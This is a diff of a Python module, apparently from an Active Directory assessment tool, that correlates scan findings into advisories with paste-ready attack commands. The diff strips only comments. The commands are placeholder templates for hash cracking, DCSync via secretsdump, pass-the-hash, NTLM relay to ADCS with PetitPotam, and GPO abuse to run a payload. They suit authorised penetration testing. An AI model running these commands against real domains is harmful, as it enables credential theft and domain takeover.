@@ -1,24 +1,3 @@
-"""
-Module — Advisories & Next-Step Recommendations
-================================================
-A post-scan rules engine that reads the accumulated findings from
-utils.output._report_data and correlates them into prioritised,
-actionable attack-path advisories.
-
-Each advisory contains:
-  • severity   — critical / high / medium / low
-  • id         — short rule identifier  (e.g. "ADV-001")
-  • title      — one-line description
-  • evidence   — what specific findings triggered this rule
-  • commands   — ready-to-paste commands / next steps
-  • references — technique IDs (MITRE ATT&CK, SpecterOps, etc.)
-
-Design principle: rules are pure functions that receive the entire
-_report_data dict and return zero or more Advisory objects.
-No network calls are made here; this module runs entirely offline
-against data already collected.
-"""
-
 from __future__ import annotations
 
 from collections import Counter
@@ -35,10 +14,6 @@ from utils.output import print_section, register_result, _report_data
 console = Console()
 
 
-# ---------------------------------------------------------------------------
-# Data model
-# ---------------------------------------------------------------------------
-
 SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
 SEVERITY_COLOUR = {
     "critical": "bright_red",
@@ -52,7 +27,7 @@ SEVERITY_COLOUR = {
 @dataclass
 class Advisory:
     id:         str
-    severity:   str          # critical | high | medium | low | info
+    severity:   str
     title:      str
     evidence:   List[str]    = field(default_factory=list)
     commands:   List[str]    = field(default_factory=list)
@@ -62,10 +37,6 @@ class Advisory:
         return SEVERITY_ORDER.get(self.severity.lower(), 99)
 
 
-# ---------------------------------------------------------------------------
-# Rule registry
-# ---------------------------------------------------------------------------
-
 _RULES: List[Callable[[Dict[str, Any]], List[Advisory]]] = []
 
 
@@ -74,10 +45,6 @@ def _rule(fn: Callable) -> Callable:
     _RULES.append(fn)
     return fn
 
-
-# ---------------------------------------------------------------------------
-# Helper accessors – safely pull sub-dicts from _report_data
-# ---------------------------------------------------------------------------
 
 def _domain(data: dict) -> dict:
     return data.get("Domain Information", {})
@@ -111,12 +78,6 @@ def _threshold_int(pp: dict) -> int:
     except (ValueError, TypeError):
         return -1
 
-
-# ===========================================================================
-# ─── RULES ──────────────────────────────────────────────────────────────────
-# ===========================================================================
-
-# ── Password-policy rules ───────────────────────────────────────────────────
 
 @_rule
 def rule_no_lockout(data: dict) -> List[Advisory]:
@@ -152,7 +113,7 @@ def rule_weak_min_length(data: dict) -> List[Advisory]:
             evidence=[f"minPwdLength = {length} (recommended ≥ 12)"],
             commands=[
                 "hashcat -m 1000 ntds.dit.hashes rockyou.txt --rules-file best64.rule",
-                "hashcat -m 1000 ntds.dit.hashes -a 3 ?a?a?a?a?a?a?a?a   # brute ≤8 chars",
+                "hashcat -m 1000 ntds.dit.hashes -a 3 ?a?a?a?a?a?a?a?a",
             ],
             references=["CIS Benchmark: minimum 14 chars", "T1110.002"],
         )]
@@ -197,8 +158,6 @@ def rule_no_complexity(data: dict) -> List[Advisory]:
         )]
     return []
 
-
-# ── Kerberoasting / AS-REP rules ─────────────────────────────────────────────
 
 @_rule
 def rule_kerberoastable(data: dict) -> List[Advisory]:
@@ -255,8 +214,6 @@ def rule_asrep_roastable(data: dict) -> List[Advisory]:
     )]
 
 
-# ── ACL / DACL rules ────────────────────────────────────────────────────────
-
 @_rule
 def rule_dcsync(data: dict) -> List[Advisory]:
     principals = _acl(data).get("dcsync_principals", [])
@@ -270,7 +227,7 @@ def rule_dcsync(data: dict) -> List[Advisory]:
         commands=[
             "# Dump ALL domain hashes without touching LSASS:",
             "secretsdump.py <DOMAIN>/<USER>:<PASS>@<DC_IP>",
-            "secretsdump.py -hashes :<NTHASH> <DOMAIN>/<USER>@<DC_IP>   # PtH",
+            "secretsdump.py -hashes :<NTHASH> <DOMAIN>/<USER>@<DC_IP>",
             "# Pass-the-Hash as any domain admin or crack offline:",
             "crackmapexec smb <DC_IP> -u Administrator -H <NT_HASH>",
         ],
@@ -321,8 +278,6 @@ def rule_writedacl(data: dict) -> List[Advisory]:
         references=["T1222 — File Permissions Modification", "BloodHound — WriteDACL edge"],
     )]
 
-
-# ── Delegation rules ─────────────────────────────────────────────────────────
 
 @_rule
 def rule_unconstrained_delegation(data: dict) -> List[Advisory]:
@@ -393,8 +348,6 @@ def rule_constrained_delegation(data: dict) -> List[Advisory]:
     )]
 
 
-# ── ADCS rules ───────────────────────────────────────────────────────────────
-
 @_rule
 def rule_adcs_esc1(data: dict) -> List[Advisory]:
     esc1 = _adcs(data).get("ESC1", [])
@@ -446,14 +399,12 @@ def rule_adcs_esc8(data: dict) -> List[Advisory]:
         commands=[
             "# Relay NTLM auth from DC to CA Web Enrollment:",
             "ntlmrelayx.py -t http://<CA_HOST>/certsrv/certfnsh.asp --adcs --template DomainController",
-            "petitpotam.py -u '' -p '' <RELAY_HOST> <DC_IP>   # trigger DC auth",
-            "certipy auth -pfx dc.pfx -dc-ip <DC_IP>           # PKINIT → get DC hash → DCSync",
+            "petitpotam.py -u '' -p '' <RELAY_HOST> <DC_IP>",
+            "certipy auth -pfx dc.pfx -dc-ip <DC_IP>",
         ],
         references=["ESC8 — Certified Pre-Owned", "T1557 — Adversary-in-the-Middle"],
     )]
 
-
-# ── SMB / file rules ─────────────────────────────────────────────────────────
 
 @_rule
 def rule_writable_shares(data: dict) -> List[Advisory]:
@@ -516,8 +467,6 @@ def rule_laps_readable(data: dict) -> List[Advisory]:
     )]
 
 
-# ── Trust / lateral movement rules ──────────────────────────────────────────
-
 @_rule
 def rule_transitive_trust(data: dict) -> List[Advisory]:
     trusts = _domain(data).get("trusts", [])
@@ -541,8 +490,6 @@ def rule_transitive_trust(data: dict) -> List[Advisory]:
     )]
 
 
-# ── GPO rules ────────────────────────────────────────────────────────────────
-
 @_rule
 def rule_gpo_dangerous_acl(data: dict) -> List[Advisory]:
     dangerous = _gpo(data).get("dangerous_gpo_acls", [])
@@ -557,13 +504,11 @@ def rule_gpo_dangerous_acl(data: dict) -> List[Advisory]:
             "# SharpGPOAbuse — add a scheduled task via the writeable GPO:",
             "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author 'NT AUTHORITY\\SYSTEM'",
             "                  --Command cmd.exe --Arguments '/c <PAYLOAD>' --GPOName '<GPO_NAME>'",
-            "gpupdate /force   # or wait for auto-refresh (~90 min)",
+            "gpupdate /force",
         ],
         references=["T1484.001 — Group Policy Modification"],
     )]
 
-
-# ── Stale / misc rules ───────────────────────────────────────────────────────
 
 @_rule
 def rule_stale_computers(data: dict) -> List[Advisory]:
@@ -576,14 +521,12 @@ def rule_stale_computers(data: dict) -> List[Advisory]:
         title=f"{len(stale)} stale computer account(s) — unmanaged endpoints may lack patching",
         evidence=[str(c) for c in stale[:5]],
         commands=[
-            "crackmapexec smb <STALE_HOST_IP> -u '' -p '' --shares   # null session probe",
+            "crackmapexec smb <STALE_HOST_IP> -u '' -p '' --shares",
             "nmap -sV -p 445,3389,5985 <STALE_HOST_IP>",
         ],
         references=["T1078.002 — Valid Domain Accounts"],
     )]
 
-
-# ── Compound / chained attack paths ─────────────────────────────────────────
 
 @_rule
 def rule_asrep_plus_no_lockout(data: dict) -> List[Advisory]:
@@ -661,10 +604,6 @@ def rule_adcs_plus_no_lockout(data: dict) -> List[Advisory]:
     return []
 
 
-# ===========================================================================
-# ─── Renderer & entry point ──────────────────────────────────────────────────
-# ===========================================================================
-
 def _collect_advisories(data: dict) -> List[Advisory]:
     advisories = []
     for rule_fn in _RULES:
@@ -734,14 +673,9 @@ def _render_summary_table(advisories: List[Advisory]) -> None:
 
 
 def run(conn=None) -> None:
-    """
-    Entry point called by admap.py module runner.
-    'conn' is intentionally unused — this module analyses offline data only.
-    Place 'advisories' last in your -m list so all other modules have run first.
-    """
     print_section("Advisories & Next-Step Recommendations")
 
-    data = dict(_report_data)   # snapshot of accumulated module results
+    data = dict(_report_data)
 
     if not data:
         console.print(
@@ -760,11 +694,9 @@ def run(conn=None) -> None:
         register_result("Advisories", {"total": 0, "advisories": []})
         return
 
-    # ── summary table ──────────────────────────────────────────────────────
     console.print()
     _render_summary_table(advisories)
 
-    # ── severity counts ────────────────────────────────────────────────────
     counts = Counter(a.severity.lower() for a in advisories)
     stat_parts = []
     for sev in ("critical", "high", "medium", "low", "info"):
@@ -774,14 +706,12 @@ def run(conn=None) -> None:
     console.print()
     console.print("  " + "  •  ".join(stat_parts))
 
-    # ── detailed advisory panels ───────────────────────────────────────────
     console.print()
     console.rule("[bold bright_magenta]Detailed Advisories[/bold bright_magenta]")
     for adv in advisories:
         console.print()
         _render_advisory(adv)
 
-    # ── persist for JSON / HTML export ────────────────────────────────────
     register_result("Advisories", {
         "total": len(advisories),
         "counts": dict(counts),
